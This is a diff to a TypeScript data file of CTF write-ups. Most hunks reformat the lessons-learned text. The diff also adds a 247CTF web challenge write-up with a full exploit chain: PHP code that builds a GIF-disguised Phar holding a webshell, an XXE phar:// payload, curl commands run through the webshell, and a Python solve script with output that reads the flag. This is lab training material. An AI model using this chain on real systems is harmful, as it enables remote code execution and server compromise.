@@ -168,7 +168,7 @@ export const writeups: WriteUp[] = [{
 ]
 ,
   "flag": "INTECHFEST{964114fd72f319375a5c7fb3081a02b7}",
-  "lessonsLearned": "Never allow clients to choose cryptographic parameters (especially primes). Always use safe primes (p = 2q+1). LCG is cryptographically broken - linear structure enables lattice attacks. Truncation alone doesn't guarantee security; underlying generator must be strong. Pohlig-Hellman breaks DLP if p-1 has only small factors."
+  "lessonsLearned": "**Parameter Selection** - Never allow clients to choose cryptographic parameters (especially primes). Always use safe primes (p = 2q+1) from trusted sources.\n\n**LCG Weakness** - LCG (Linear Congruential Generator) is cryptographically broken. Linear structure enables lattice attacks (LLL) that recover the entire state.\n\n**Truncation** - Truncation alone doesn't guarantee security. The underlying generator must be cryptographically strong (use CTR-mode or ChaCha20 instead).\n\n**Pohlig-Hellman** - Pohlig-Hellman algorithm breaks discrete logarithm if p-1 has only small prime factors. Always use groups where p-1 has at least one large prime factor.\n\n**Key Recovery** - GCD-based techniques can recover keys when the same parameters are used across multiple ciphertexts. Avoid parameter reuse."
 
 },
 {
@@ -221,7 +221,7 @@ export const writeups: WriteUp[] = [{
     }
   ],
   "flag": "VuwCTF{rU5tac3Ans_uN1te_agA1n5t_uN5aFe_l4ngUaG3s}",
-  "lessonsLearned": "JIT compilers must validate input constraints (bracket matching) before code generation. Stack-based return addresses are dangerous; use shadow stacks or CFI (Control Flow Integrity). RWX memory is a severe risk - use RX after generation. Shellcode must account for caller-corrupted registers; always initialize before syscalls. Brainfuck loops enable compact encoding of repetitive data, making size-limited payloads viable."
+  "lessonsLearned": "**JIT Validation** - JIT compilers must validate input constraints (bracket matching) before code generation. Unsafe parsing allows control-flow hijacking.\n\n**Stack Protection** - Stack-based return addresses are dangerous. Use shadow stacks or CFI (Control Flow Integrity) to prevent arbitrary code execution.\n\n**Memory Permissions** - RWX (Read-Write-Execute) memory is a severe security risk. Use RX (Read-Execute only) after code generation to prevent self-modifying attacks.\n\n**Shellcode Initialization** - Shellcode must account for caller-corrupted registers. Always initialize registers before syscalls rather than assuming clean state.\n\n**Encoding Techniques** - Brainfuck loops enable compact encoding of repetitive data, making size-limited payloads viable. Domain-specific languages can be exploited for payload reduction."
 
 },
 {
@@ -271,7 +271,7 @@ export const writeups: WriteUp[] = [{
     }
   ],
   "flag": "ptm{Th1s_4_Funny_w4y_to_ch3ck_f0R_4_p455w0rd}",
-  "lessonsLearned": ".NET assemblies should not be considered secure - decompilation to near-original source is trivial with tools like ilspycmd or dnSpy. Embedding secrets in compiled code (especially validation logic) provides no real protection. Passwords and flags should never be validated client-side; real authentication requires server-side checks. Multiple encoding schemes in sequence (MD5, Base64, Hex, etc.) do not increase security - they merely obfuscate, and each layer is independently reversible. Always use cryptographically sound approaches: hashing with salts, secure random generation, and server-side verification."
+  "lessonsLearned": "**.NET Security** - .NET assemblies should not be considered secure. Decompilation to near-original source is trivial with tools like ilspycmd or dnSpy.\n\n**Secret Embedding** - Embedding secrets in compiled code (especially validation logic) provides no real protection. Move sensitive operations server-side always.\n\n**Client-Side Validation** - Passwords and flags should never be validated client-side. Real authentication requires server-side checks that cannot be bypassed.\n\n**Encoding is not Encryption** - Multiple encoding schemes in sequence (MD5, Base64, Hex, etc.) do not increase security. They merely obfuscate, and each layer is independently reversible.\n\n**Proper Cryptography** - Always use cryptographically sound approaches: hashing with salts, secure random generation, and server-side verification. Never roll your own security."
 
 },
 {
@@ -331,7 +331,7 @@ export const writeups: WriteUp[] = [{
     }
   ],
   "flag": "UNLP{4nnnnd-th3-0sc4r-w1nn333rrr-isssss-yoU}",
-  "lessonsLearned": "Seccomp filters block common patterns (execve) - security relies on multiple layers. Unusual gadget behavior (ret 0x13) requires careful stack layout planning in ROP chains. Format string vulnerabilities provide reliable information disclosure even with ASLR. Combining multiple small vulnerabilities (format string + buffer overflow) creates exploitable conditions. Always validate input sizes on stack buffers - a single read() call can overflow multiple stack frames. When ROP gadgets are limited, every byte of padding and register initialization matters."
+  "lessonsLearned": "**Seccomp Filters** - Seccomp filters block common patterns (execve) by restricting system calls. Security relies on multiple defense layers, not a single protection mechanism.\n\n**ROP Gadgets** - Unusual gadget behavior (ret 0x13) requires careful stack layout planning in ROP chains. Account for non-standard gadget side effects.\n\n**Information Disclosure** - Format string vulnerabilities provide reliable information disclosure even with ASLR. A single leak is often sufficient to defeat memory protections.\n\n**Vulnerability Chaining** - Combining multiple small vulnerabilities (format string + buffer overflow) creates exploitable conditions. Single vulnerabilities may be insufficient.\n\n**Buffer Validation** - Always validate input sizes on stack buffers. A single read() call can overflow multiple stack frames and overwrite unrelated data.\n\n**ROP Tuning** - When ROP gadgets are limited, every byte of padding and register initialization matters. Precise control flow is essential for success."
 
 },
 {
@@ -379,7 +379,7 @@ export const writeups: WriteUp[] = [{
     }
   ],
   "flag": "VuwCTF{d0_y0u_wan7_t0,,,l15t3n_t0_it?}",
-  "lessonsLearned": "Network forensics requires examining all packet fields, not just payload data. Custom protocols can hide information in headers, metadata, or other structural elements. Flag encoding doesn't always involve cryptography - simple character encoding (3-digit decimal) can effectively obscure data from quick examination. Covert channels in network traffic are real security concerns - information can be hidden in sequence numbers, timing, packet order, or header fields. When analyzing unknown protocols, fuzzing field positions and checking for ASCII patterns is an effective reverse engineering technique. Don't assume the main file transfer is the goal - metadata and headers often contain the real secrets."
+  "lessonsLearned": "**Protocol Analysis** - Network forensics requires examining all packet fields, not just payload data. Custom protocols can hide information in headers, metadata, or other structural elements.\n\n**Encoding vs Encryption** - Flag encoding doesn't always involve cryptography. Simple character encoding (3-digit decimal) can effectively obscure data from quick examination.\n\n**Covert Channels** - Covert channels in network traffic are real security concerns. Information can be hidden in sequence numbers, timing, packet order, or header fields.\n\n**Protocol Reverse Engineering** - When analyzing unknown protocols, fuzzing field positions and checking for ASCII patterns is an effective reverse engineering technique.\n\n**Hidden Secrets** - Don't assume the main file transfer is the goal. Metadata and headers often contain the real secrets and important information.\n\n**Systematic Examination** - Always perform packet-by-packet analysis. Extract and test each field independently to find the source of meaningful information."
 
 },
 {
@@ -452,7 +452,7 @@ export const writeups: WriteUp[] = [{
     }
   ],
   "flag": "ptm{A1w4y5_m4k3_5ur3_t0_ch4ng3_y0ur_d3f4u1t_p4s5w0rd!}",
-  "lessonsLearned": "RSA security depends on keeping the private key secret - even information leaks about plaintext properties (LSB, parity) enable devastating attacks. Never rely on a single piece of information for security; multi-factor design (oracle + key recovery) creates compound vulnerabilities. Default credentials must always be changed in production systems. Binary search via oracle is an efficient technique when exact decryption is impossible. Network optimization (pipelining, skipping unnecessary bits) is critical in time-constrained attacks. GCD-based key recovery shows that reusing RSA keys across different applications is dangerous - each ciphertext is a potential source of information about the modulus."
+  "lessonsLearned": "**Information Leaks** - RSA security depends on keeping the private key secret. Even information leaks about plaintext properties (LSB, parity) enable devastating attacks like Bleichenbacher's oracle.\n\n**Compound Vulnerabilities** - Never rely on a single piece of security information. Multi-factor design (oracle + key recovery) creates compound vulnerabilities that are exponentially more dangerous.\n\n**Default Credentials** - Default credentials must always be changed in production systems. Change default passwords immediately upon system deployment.\n\n**Oracle Attacks** - Binary search via oracle is an efficient technique when exact decryption is impossible. Timing/response differences can leak one bit of information per request.\n\n**Optimization** - Network optimization (pipelining, skipping unnecessary bits) is critical in time-constrained attacks. Parallelization and smart enumeration reduce exploitation time significantly.\n\n**RSA Reuse** - GCD-based key recovery shows that reusing RSA keys across different applications is dangerous. Each ciphertext is a potential source of information about the modulus."
 
 },
 {
@@ -504,7 +504,7 @@ export const writeups: WriteUp[] = [{
     }
   ],
   "flag": "EPFL{5CR1P71NG_15_CH34T1NG}",
-  "lessonsLearned": "Wordle-variant challenges require robust parsing of variable input formats - always extract structure before processing. ANSI color codes are common in terminal-based CTF challenges; regex and character-by-character parsing are essential tools. Dictionary-based solving is effective for word games - preprocessing by length dramatically improves lookup speed. Multi-session challenges can be solved by automating the entire workflow within a loop. Stateless puzzles with limited attempts benefit from greedy/heuristic approaches; perfect optimization isn't always necessary. Terminal output parsing requires careful handling of escape sequences, line breaks, and timing - use robust buffer management (recv_until patterns). Consider word frequency and letter distribution for initial guess selection - starting with common words improves convergence in brute-force approaches."
+  "lessonsLearned": "**Input Parsing** - Wordle-variant challenges require robust parsing of variable input formats. Always extract structure before processing to make solving systematic and reliable.\n\n**Terminal Output** - ANSI color codes are common in terminal-based CTF challenges. Regex and character-by-character parsing are essential tools for terminal output analysis.\n\n**Dictionary Optimization** - Dictionary-based solving is effective for word games. Preprocessing by length dramatically improves lookup speed and reduces computation.\n\n**Automation** - Multi-session challenges can be solved by automating the entire workflow within a loop. Stateless puzzles benefit from repeating the attack across many sessions.\n\n**Heuristics** - Limited attempts benefit from greedy/heuristic approaches. Perfect optimization isn't always necessary; smart initial guesses improve convergence.\n\n**Buffer Management** - Terminal output parsing requires careful handling of escape sequences, line breaks, and timing. Use robust buffer management (recv_until patterns) rather than fixed-size reads.\n\n**Strategy** - Consider word frequency and letter distribution for initial guess selection. Starting with common words improves convergence in brute-force word finding approaches."
 
 },
 {
@@ -525,7 +525,7 @@ export const writeups: WriteUp[] = [{
     "NoSQL Injection Techniques",
     "MongoDB Query Manipulation"
   ],
-  "analysis": "Security analysis reveals four critical vulnerabilities chained together in the API implementation:\n\n**Vulnerability 1: Blind NoSQL Injection on /api/forgot-password** - The endpoint accepts an email parameter that is directly interpolated into MongoDB queries without sanitization. By sending operator objects like {\n  \"email\": {\"$regex\": \"^pattern\"}\n} in the JSON payload, an attacker can perform regex-based queries. Each request returns either 200 OK (match found) or 404 Not Found (no match), creating a timing/response-based oracle. This allows character-by-character enumeration of usernames in the database.\n\n**Vulnerability 2: Insufficient Token Validation on /api/reset-password** - The password reset endpoint accepts a token field in the request body, which is directly used in a MongoDB filter condition without verification. An attacker can send wildcard regex patterns like {\n  \"token\": {\"$regex\": \"^.*\"},\n  \"newPassword\": \"attacker_controlled\"\n} to match ANY token in the database, not just their own.\n\n**Vulnerability 3: Sequential Document Processing Flaw** - MongoDB's findOne() method returns the first matching document in insertion order. When multiple tokens match the wildcard pattern, only the first document is updated. By repeatedly sending requests with the same wildcard token filter, an attacker exhausts tokens of earlier-inserted dummy/decoy accounts until reaching the target admin account.\n\n**Vulnerability 4: Sensitive Data Leakage in API Response** - The web UI does not display the flag or sensitive admin fields, but the backend leaks them directly in the JSON response from /api/login. The flag is embedded in the user object returned after successful authentication, discoverable only through raw HTTP response inspection rather than visual inspection of the web interface.",
+  "analysis": "Security analysis reveals four critical vulnerabilities chained together in the API implementation:\n\n**Vulnerability 1: Blind NoSQL Injection on /api/forgot-password**\n\nThe endpoint accepts an email parameter that is directly interpolated into MongoDB queries without sanitization. By sending operator objects with regex patterns in the JSON payload, an attacker can perform regex-based queries. Each request returns either 200 OK (match found) or 404 Not Found (no match), creating a response-based oracle allowing character-by-character enumeration of usernames.\n\n**Vulnerability 2: Insufficient Token Validation on /api/reset-password**\n\nThe password reset endpoint accepts a token field in the request body, which is directly used in a MongoDB filter condition without verification. An attacker can send wildcard regex patterns to match ANY token in the database, not just their own.\n\n**Vulnerability 3: Sequential Document Processing Flaw**\n\nMongoDB's findOne() method returns the first matching document in insertion order. When multiple tokens match the wildcard pattern, only the first document is updated. By repeatedly sending requests with the same wildcard token filter, an attacker exhausts tokens until reaching the target admin account.\n\n**Vulnerability 4: Sensitive Data Leakage in API Response**\n\nThe web UI does not display sensitive admin fields, but the backend leaks them directly in the JSON response from /api/login. The flag is embedded in the user object returned after successful authentication, discoverable only through raw HTTP response inspection.",
   "solution": [
     {
       "title": "Step 1: Reconnaissance & Vulnerability Mapping",
@@ -566,6 +566,82 @@ export const writeups: WriteUp[] = [{
     }
   ],
   "flag": "FlagY{9f4e47684e72251c97a092123b6176c1}",
-  "lessonsLearned": "Never trust user input in database queries - always use parameterized queries and proper input validation. NoSQL operators like $regex must be explicitly blocked in user-controlled parameters. Password reset mechanisms are critical security components; implement proper token validation (time-limited, single-use, cryptographically random). Query results should not rely on insertion order for security decisions; always use explicit accountability mechanisms. Sensitive data should never be exposed in API responses, even to authenticated users without explicit authorization. Implement rate limiting on authentication endpoints to prevent token exhaustion attacks. Use defense-in-depth: combine input validation, proper query construction, and response sanitization to prevent information disclosure."
+  "lessonsLearned": "**Input Validation** - Never trust user input in database queries. Always use parameterized queries and proper input validation. NoSQL operators like $regex must be explicitly blocked in user-controlled parameters.\n\n**Token Management** - Password reset mechanisms are critical security components. Implement proper token validation (time-limited, single-use, cryptographically random) to prevent unauthorized access.\n\n**Query Security** - Query results should not rely on insertion order for security decisions. Always use explicit accountability mechanisms and verify users can only access their own data.\n\n**Data Exposure** - Sensitive data should never be exposed in API responses, even to authenticated users without explicit authorization. Implement proper field filtering based on user role.\n\n**Rate Limiting** - Implement rate limiting on authentication and password reset endpoints to prevent token exhaustion attacks and brute-force attempts.\n\n**Defense in Depth** - Combine input validation, proper query construction, and response sanitization to prevent information disclosure. Single-layer defenses are insufficient.\n\n**Optimization** - When exploiting APIs with many requests, implement parallel requests and smart enumeration strategies to accelerate the exploitation timeline."
+
+},
+{
+  "id": "10",
+  "title": "Meme Upload Service",
+  "category": "Web",
+  "difficulty": "Hard",
+  "points": 0,
+  "date": "2025-02-24",
+  "author": "CTF Team",
+  "ctfName": "247CTF",
+  "description": "Advanced web exploitation chaining file upload bypass, XML External Entity (XXE) injection, and PHP Phar deserialization to achieve Remote Code Execution (RCE). Requires bypassing multiple validation layers.",
+  "problemDescription": "A meme upload service with two features: image upload (with strict validation) and XML message storage. The application validates file uploads using MIME type checks and getimagesize(), then parses XML messages with schema validation. Goal: bypass all security checks to achieve arbitrary code execution and retrieve the flag file.",
+  "tools": [
+    "PHP",
+    "Python 3",
+    "Phar Archive Manipulation",
+    "XXE Injection",
+    "Magic Bytes Spoofing",
+    "PHP Serialization"
+  ],
+  "analysis": "This challenge chains three distinct vulnerabilities into a complete exploitation chain:\n\n**Vulnerability 1: Insecure XML External Entity (XXE) Processing**\n\nThe application loads XML with `$msgXml->loadXML($_POST[\"message\"], LIBXML_DTDLOAD);`. The LIBXML_DTDLOAD flag enables parsing of external DTD files, allowing attackers to inject custom DOCTYPE declarations with SYSTEM entities. This opens the door to XXE attacks using stream wrappers like phar://.\n\n**Vulnerability 2: File Upload Bypass via Magic Bytes**\n\nThe getimagesize() function validates uploaded files by reading image headers (magic bytes). By prepending a valid GIF header (GIF8) to arbitrary data, the function accepts the file as legitimate. Additionally, a 185-byte size limit forces payload minimization through Phar signature algorithm reduction (MD5 instead of SHA256).\n\n**Vulnerability 3: Unsafe PHP Object Deserialization via Phar**\n\nPHP's phar:// stream wrapper automatically deserializes metadata stored in Phar archives when accessed. If the metadata contains serialized PHP objects of classes present in the application (like Message), accessing phar://path/to/file triggers automatic deserialization and invokes magic methods like __destruct().\n\n**Chaining the Vulnerabilities**\n\nThe Message class's __destruct() method writes arbitrary content to arbitrary paths using file_put_contents(). By crafting a malicious Phar with a Message object where filePath='a.php' and manipulated properties containing PHP code, attackers can write executable webshells to the web root.",
+  "solution": [
+    {
+      "title": "Step 1: Analyze Source Code Structure",
+      "content": "Examine index.php and valid_message.xsd to understand validation logic. Identify the Message class and its __destruct() magic method as the key to code execution. The destructor writes three variables to a file, any of which can contain PHP code."
+    },
+    {
+      "title": "Step 2: Craft Malicious Phar Archive",
+      "content": "Create a Phar file that:\n1. Has GIF8 magic bytes prepended to bypass getimagesize()\n2. Uses MD5 signature to stay under 185-byte limit\n3. Contains a serialized Message object in metadata with: filePath set to 'a.php', to property containing PHP code like '<?=`$_GET[0]`?>'\n4. The __destruct() will write this into a.php when deserialized",
+      "code": "<?php\nclass Message {};\n$obj = new Message;\n$obj->to = '<?=`$_GET[0]`?>';\n$obj->filePath = 'a.php';\n\n$phar = new Phar('tmp.phar');\n$phar->setSignatureAlgorithm(Phar::MD5);\n$phar->startBuffering();\n$phar->setStub('GIF8<?php __HALT_COMPILER();');\n$phar->setMetadata($obj);\n$phar->addFromString('a', '');\n$phar->stopBuffering();\n\n$f = fopen('tmp.phar', 'r');\necho fread($f, filesize('tmp.phar'));\nfclose($f);\n@unlink('tmp.phar');\n?>"
+    },
+    {
+      "title": "Step 3: Upload Malicious File",
+      "content": "Upload the Phar file through the image upload endpoint. The file passes all validation checks because:\n- Magic bytes GIF8 satisfy getimagesize()\n- MIME type matches image/gif\n- File size is under 185 bytes\nThe endpoint returns the upload path (e.g., /tmp/images/xxxx.gif)"
+    },
+    {
+      "title": "Step 4: Craft XXE Payload",
+      "content": "Create an XML payload with DOCTYPE that references the uploaded Phar file using phar:// stream wrapper. When the XML parser processes the external entity, it reads from phar://path/to/image.gif, triggering automatic Phar deserialization.",
+      "code": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"phar:///tmp/images/UPLOAD_PATH\"> %xxe;]>\n<message>\n  <to>a</to>\n  <from>b</from>\n  <image>c</image>\n</message>"
+    },
+    {
+      "title": "Step 5: Trigger Deserialization",
+      "content": "Submit the XXE payload via POST to the message endpoint. The XML parser attempts to load the DOCTYPE entity from phar://, which automatically deserializes the Message object. The object's __destruct() is invoked during garbage collection, writing the PHP webshell to a.php in the web root."
+    },
+    {
+      "title": "Step 6: Execute Commands via Webshell",
+      "content": "Access a.php with GET parameters. The webshell executes arbitrary commands via backticks in PHP. Use this to find the flag file location and read its contents.",
+      "code": "# Find flag files\ncurl 'https://target/a.php?0=find%20/%20-name%20%27*flag*%27%202>/dev/null'\n\n# Read flag\ncurl 'https://target/a.php?0=cat%20/tmp/flag_XXXXXXX.txt'"
+    },
+    {
+      "title": "Step 7: Automated Exploitation Script (solve.py)",
+      "content": "Complete Python automation script that orchestrates the entire exploitation chain:\n1. Generate and compile Phar payload using create_phar.php\n2. Upload malicious Phar as GIF image\n3. Extract upload path from server response\n4. Craft and submit XXE payload with phar:// reference\n5. Execute arbitrary commands through webshell\n\nUsage: python3 solve.py [optional_command]",
+      "code": "import re\nimport subprocess\nimport sys\nimport requests\nimport urllib3\n\nurllib3.disable_warnings()\ns = requests.Session()\ns.verify = False\n\nBASE_URL = \"https://9f12ade61851e040.247ctf.com\"\n\nXML_PAYLOAD = \"\"\"\\\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"phar://{path}\"> %xxe;]>\n<message>\n  <to>a</to>\n  <from>b</from>\n  <image>c</image>\n</message>\n\"\"\"\n\ndef main():\n    if len(sys.argv) != 2:\n        print(\"[*] Stage 1: Creating Phar payload...\")\n        # Bypass phar.readonly restriction in CLI\n        p = subprocess.run([\"php\", \"-d\", \"phar.readonly=0\", \"create_phar.php\"], capture_output=True, check=True)\n        phar = p.stdout\n        assert len(phar) <= 185, f\"Phar size {len(phar)} exceeds 185 bytes\"\n        print(f\"[+] Phar payload created ({len(phar)} bytes)\")\n        \n        print(\"[*] Stage 2: Uploading malicious Phar as GIF...\")\n        # Upload phar\n        r = s.post(BASE_URL, files={\"image\": (\"test.gif\", phar, \"image/gif\")})\n        m = re.findall(r\"Image uploaded (.*?)!\", r.text)\n        assert m, \"Failed to upload image\"\n        image_path = m[0]\n        print(f\"[+] Phar uploaded to: {image_path}\")\n        \n        print(\"[*] Stage 3: Triggering XXE deserialization...\")\n        # Trigger XXE\n        r = s.post(BASE_URL, data={\"message\": XML_PAYLOAD.format(path=image_path)})\n        assert \"Message stored\" in r.text, \"Failed to upload XML\"\n        print(\"[+] Webshell successfully planted at a.php\")\n    else:\n        cmd = sys.argv[1]\n        print(f\"[*] Executing command: {cmd}\\n\")\n        r = s.get(f\"{BASE_URL}/a.php\", params={\"0\": cmd})\n        m = re.findall(r\"Hey (.*)! Take\", r.text, re.MULTILINE | re.DOTALL)\n        if m:\n            print(\"[+] Output Result:\\n\")\n            print(m[0].strip())\n        else:\n            print(\"[!] No output captured\")\n\nif __name__ == \"__main__\":\n    main()"
+    }
+  ],
+  "terminalOutputs": [
+    {
+      "command": "python3 solve.py ls",
+      "output": "[*] Mengeksekusi perintah: ls\n\n[+] Hasil Output:\n\na.php\nindex.html\nindex.php\nvalid_message.xsd"
+    },
+    {
+      "command": "python3 solve.py 'ls -la /'",
+      "output": "[*] Mengeksekusi perintah: ls -la /\n\n[+] Hasil Output:\n\ntotal 0\ndrwxr-xr-x   1 root   root      39 Feb 23 19:43 .\ndrwxr-xr-x   1 root   root      39 Feb 23 19:43 ..\n-rwxr-xr-x   1 root   root       0 Feb 23 19:43 .dockerenv\ndrwxr-xr-x   1 root   root      28 Dec 29  2018 bin\ndrwxr-xr-x   1 root   root      28 Dec 29  2018 boot\ndrwxr-xr-x   1 root   root       0 Dec 26  2018 cgroup\ndr-xr-xr-x   1 root   root       0 Dec 26  2018 cgroup2\ndrwxr-xr-x   5 root   root     360 Feb 23 19:42 dev\ndrwxr-xr-x   1 root   root      66 Feb 23 19:42 etc\ndrwxr-xr-x   1 root   root      19 Dec 26  2018 home\ndrwxr-xr-x   1 root   root      13 Dec 29  2018 lib\ndrwxr-xr-x   2 root   root      37 Dec 29  2018 lib64\ndrwxr-xr-x   2 root   root       6 Dec 29  2018 media\ndrwxr-xr-x   2 root   root       6 Dec 29  2018 mnt\ndrwxr-xr-x   2 root   root       6 Dec 29  2018 opt\ndr-xr-xr-x 117 root   root       0 Dec 26  2018 proc\ndr-xr-x---   2 root   root     160 Feb 23 19:42 root\ndrwxr-xr-x   1 root   root      28 Dec 29  2018 run\ndrwxr-xr-x   1 root   root      32 Dec 29  2018 sbin\ndrwxr-xr-x   2 root   root       6 Dec 29  2018 srv\ndr-xr-xr-x  13 root   root       0 Dec 26  2018 sys\ndrwxrwxrwt   1 root   root      36 Feb 23 19:48 tmp\ndrwxr-xr-x   1 root   root      19 Dec 26  2018 usr\ndrwxr-xr-x   1 root   root      17 Dec 29  2018 var"
+    },
+    {
+      "command": "python3 solve.py \"find / -name '*flag*' 2>/dev/null | grep -E '(^[^/proc]|flag_)'\"",
+      "output": "[*] Mengeksekusi perintah: find / -name '*flag*' 2>/dev/null\n\n[+] Hasil Output:\n\n/tmp/flag_0073c38db2a4d3c1.txt"
+    },
+    {
+      "command": "python3 solve.py \"cat /tmp/flag_0073c38db2a4d3c1.txt\"",
+      "output": "[*] Mengeksekusi perintah: cat /tmp/flag_0073c38db2a4d3c1.txt\n\n[+] Hasil Output:\n\n247CTF{0073c38db2a4d3c1209caa84ccc5668f}"
+    }
+  ],
+  "flag": "247CTF{0073c38db2a4d3c1209caa84ccc5668f}",
+  "lessonsLearned": "**File Upload Validation** - File upload validation must use multiple independent checks - magic bytes alone are insufficient. Always use whitelist MIME types, disable PHP execution in upload directories, and validate file content properly.\n\n**XML Security** - Never enable LIBXML_DTDLOAD flag unless absolutely necessary. XXE vulnerabilities are critical in XML processing with potentially catastrophic impact.\n\n**Deserialization Gadgets** - PHP magic methods (__destruct, __wakeup, __toString) combined with user-controllable object properties create dangerous deserialization gadget chains. Audit all classes with magic methods for exploitation potential.\n\n**Stream Wrappers** - Phar archives with stream wrappers (phar://) automatically trigger deserialization. Treat php:// and phar:// URI schemes as code execution vectors and restrict their use.\n\n**Payload Optimization** - Size-limited payloads can be optimized through algorithm selection (MD5 vs SHA256 signatures) and tight code golf. Always account for creative constraints when building exploits.\n\n**Defense in Depth** - Multi-layer exploitation chains are more likely to bypass defense in depth. Defensive measures must address all layers simultaneously, not just individual components.\n\n**Exposure Prevention** - Command execution endpoints should never be exposed. The webshell a.php demonstrates that even small successful writes lead to complete system compromise."
 
 }];
